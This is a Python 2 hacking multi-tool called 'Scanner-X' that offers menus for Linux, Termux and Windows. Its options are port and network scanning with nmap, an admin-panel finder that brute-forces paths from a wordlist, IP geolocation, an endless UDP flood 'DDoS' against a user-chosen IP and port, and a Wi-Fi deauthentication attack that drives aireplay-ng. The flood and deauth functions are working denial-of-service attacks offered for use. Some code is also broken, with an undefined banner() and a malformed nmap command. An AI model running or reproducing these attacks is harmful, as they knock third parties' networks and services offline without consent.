#!/usr/bin/python
import random
import sys
import os
import socket
import time
import json
import urllib2
from urllib2 import Request, urlopen, URLError, HTTPError
from colors import *



#############################################


def PortScanner():
    print ga.blue
    os.system("clear")
    os.system("figlet Port Scanner")
    IP = raw_input("WebSite To Scan: ")
    command = "nmap "+ IP
    process = os.popen(command)
    info = str(process.read())
    print info

def PortScannerWIN():
    os.system("cls")
    os.system("color 1")
    server = raw_input("Server To Scan: ")
    serverip = socket.gethostbyname(server)
    os.system("cls")
    
    print "----------------------------------+"
    print "Scanning Host: ",  serverip, "   +"
    print "----------------------------------+"
    c=0
    try:
        for port in range(1,1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((serverip,port))
            if result == 0:
                c = c + 1
                print "Port: ",port,"/TCP", "  OPEN"
            sock.close() 
        print c, ":" "Opened Ports"
    except KeyboardInterrupt:
        print "\n"
        print "you pressed Ctrl+C"
        sys.exit()

##################

def findAdmin():
	print ga.yellow
        os.system("clear")
        os.system("figlet Admin Panel Finder")
	f = open("link.txt","r");
	link = raw_input("Enter WebSite Name: ")
	print "\n\nAvilable links : \n"
	while True:
		sub_link = f.readline()
		if not sub_link:
			break
		req_link = "http://"+link+"/"+sub_link
		req = Request(req_link)
		try:
			response = urlopen(req)
		except HTTPError as e:
			continue
		except URLError as e:
			continue
		else:
			print "OK => ",req_link

def findAdminWIN():
        os.system("cls")
        os.system("color 9")
	f = open("link.txt","r");
	link = raw_input("Enter WebSite Name: ")
	print "\n\nAvilable links : \n"
	while True:
		sub_link = f.readline()
		if not sub_link:
			break
		req_link = "http://"+link+"/"+sub_link
		req = Request(req_link)
		try:
			response = urlopen(req)
		except HTTPError as e:
			continue
		except URLError as e:
			continue
		else:
			print "OK => ",req_link
			
##################################################
def iplocate():
    print ga.red
    while True:
	ip1=raw_input("IP Address: ")
	url = "http://ip-api.com/json/"
	response = urllib2.urlopen(url + ip1)
	data = response.read()
	values = json.loads(data)
	os.system("clear")
	print "\n"
	print(" IP: " + values['query'])
	print(" Status: " + values['status'])
	print(" Region: " + values['regionName'])
	print(" Country: " + values['country'])
	print(" City: " + values['city'])
	print(" ISP: " + values['isp'])
	print(" Lat,Lon: " + str(values['lat']) + "," + str(values['lon']))
	print(" ZIPCODE: " + values['zip'])
	print(" TimeZone: " + values['timezone'])
	print(" AS: " + values['as'])
	print "\n"
	print ga.yellow
	print "Thanks For Using My Tool :D"
	exit()
              
def DDoS():
    print ga.red
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(2048)
    os.system("clear")
    os.system("figlet IceBot-DDOS")
    time.sleep(2)
    os.system("clear")
    os.system("figlet DDOS-IceBot")
    time.sleep(2)
    os.system("clear")
    os.system("figlet Keep Hacking")
    print
    ip = raw_input("Target IP : ")
    port = input("Target Port : ")
    os.system("clear")
    for i in range(2):
	    os.system("figlet Good Luck")
	    time.sleep(1)
	    os.system("clear")
	    os.system("figlet Good Luck.")
	    time.sleep(1)
	    os.system("clear")
	    os.system("figlet Good Luck..")
	    time.sleep(1)
	    os.system("clear")
	    os.system("figlet Good Luck...")
	    time.sleep(1)
	    os.system("clear")
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1

            print "Sent: %s packet to: %s throught port:%s"%(sent,ip,port)
    except KeyboardInterrupt:
        print "exiting"

def DDoSWIN():
    os.system("cls")
    os.system("color 4")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(2048)
    ip = raw_input("Target IP : ")
    port = input("Target Port : ")
    ##############################
    os.system("clear")
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1

            print "Sent: %s packet to: %s throught port:%s"%(sent,ip,port)
    except KeyboardInterrupt:
        print "exiting"


#################
def Update():
    print ga.rose
    os.system("clear")
    os.system("figlet Update")
    os.system("apt-get update && apt-get upgrade && apt-get dist-upgrade -y")
    os.system("clear")
    os.system("figlet Updated")

def termux():
    print ga.grey
    os.system("clear")
    os.system("figlet UPDATE")
    os.system("apt update && apt upgrade")
    os.system("clear")
    os.system("figlet UPDATED")
    os.system("ls")

def webSiteInfo():
	print ga.lightblue
        os.system("clear")
        server = raw_input("WebSite: ")
        ip = socket.gethostbyname(server)
        print "scanning ---> " +  ip
        command = 'whois '+ server
        process = os.popen(command)
        info = str(process.read())
        print info

def ip():
    os.system("cls")
    os.system("color 6")
    server = raw_input("WebSite: ")
    ip = socket.gethostbyname(server)
    print server, "----->", ip

def networkScanner():
    print ga.yellow
    os.system("clear")
    os.system("figlet Net-Scanner")
    print "[1]  Simple Network Scan"
    print "[2]  Port Scan And OS Detection"
    arg = input("-----> ")
    if arg == 1:
        os.system("clear")
        print "Example: 192.168.1.0/27  (Scans First 32 Hosts)"
        print "\n"
        ip = raw_input("NetWork IP: ")
        os.system("clear")
        os.system("figlet Scanning...")
        command = "nmap -sL "+ ip
        process = os.popen(command)
        info = str(process.read())
        print info
    elif arg == 2:
        os.system("clear")
        print "Example: 192.168.1.0/27  (Scans First 32 Hosts)"
        print "\n"
        ip = raw_input("NetWork IP: ")
        os.system("clear")
        os.system("figlet Scanning...")
        command = "nmap -sS -O  "+ ip
        process = os.popen(command)
        info = str(process.read())
        print info

def deauth():
    print ga.red
    os.system("clear")
    os.system("figlet DEAUTH")
    print "When airodump-ng opens be sure to capture the MAC and CHANNEL of the access point" 
    print "Then press Ctrl+C"
    print "[1] wlan0"
    print "[2] wlan1"
    inter = input("> ")
    if inter == 1:
        c = "airmon-ng start wlan0"
        p = os.popen(c)
        interface = "wlan0mon"
	os.system("gnome-terminal -- airodump-ng wlan0mon")
    elif inter == 2:
        c = "airmon-ng start wlan1"
        p = os.popen(c)
        interface = "wlan1mon"
	os.system("gnome-terminal -- airodump-ng wlan1mon")
    mac = raw_input("MAC Of The access point: ")
    channel = raw_input("Channel: ")
    os.system("clear")
    os.system("figlet deauth NetWork")
    print "Ctrl+C To Stop The Attack"
    com = "iwconfig " + interface + " " +" channel " + channel
    pr = os.popen(com)
    command = "aireplay-ng --deauth  0 -a "+ mac + " " + interface 
    process = os.popen(command)


def netscanterm():
    print ga.yellow
    os.system("clear")
    os.system("figlet NetScan")
    ip = raw_input("NetWork IP: ")
    os.system("clear")
    os.system("figlet Scanning")
    command = "nmap -sL ", ip
    process = os.popen(command)
    info = str(process.read())
    print info


#################
os.system("cls")
os.system("clear")
os.system("figlet Scanner-X")
print "[1] For Kali-Parrot"
print "[2] For Termux"
print "[3] For Windows"
print "\n"
soft = input("Software: ")
if soft == 1:
    print ga.red
    os.system("clear")
    print banner()
    os.system("figlet Scanner-X")
    print ga.green
    print "[1] WebSite Port Scanner   [6] Deauth Access Point"
    print "[2] Admin Panel Finder     [7] Find WebSite Info"
    print "[3] IP-GeoLocate           [8] Linux Update"
    print "[4] DOS Tool               [9] Termux Update"
    print "[5] Network-Scanner        [0] Exit"
    print "\n" 

    tool = input("----> ")

    if tool == 0:
	exit()
    elif tool == 1:
        PortScanner()

    elif tool == 2:
        findAdmin()
    
    elif tool == 3:
	iplocate()

    elif tool == 4:
        DDoS()
   
    elif tool == 5:
        networkScanner()
    
    elif tool == 6:
        deauth()    

    elif tool == 7:
        webSiteInfo()

    elif tool == 8:
        Update()
	
    elif tool == 9:
	termux()

elif soft == 2:
    print ga.red
    os.system("clear")
    print banner()
    os.system("figlet Scanner-X")
    print ga.green
    print "[1] WebSite Port Scanner   [5] DOS Tool" 
    print "[2] Admin Panel Finder     [6] Find WebSite Info"
    print "[3] IP-GeoLocate           [7] Update"
    print "[4] Scan Network           [8] Exit"
    print "\n" 

    tool = input("----> ")

    if tool == 0:
	exit()
    elif tool == 1:
        PortScanner()

    elif tool == 2:
        findAdmin()
    
    elif tool == 3:
	iplocate()

    elif tool == 4:
        netscanterm()

    elif tool == 5:
        DDoS()
   
    elif tool == 6:
        webSiteInfo()

    elif tool == 7:
	termux()
    elif tool == 8:
        exit()

        
elif soft == 3:
    os.system("cls")
    os.system("color 4")
    print banner()
    print ga.blue
    print "[1]  Port Scanner"
    print "[2]  Admin Panel Finder"
    print "[3]  DDoS Tool"
    print "[4]  Find Websites IP"
    print "\n" 

    tool = input("----> ")

    if tool == 1:
        PortScannerWIN()

    elif tool == 2:
        findAdminWIN()

    elif tool == 3:
        DDoSWIN()  

    elif tool == 4:
        ip()


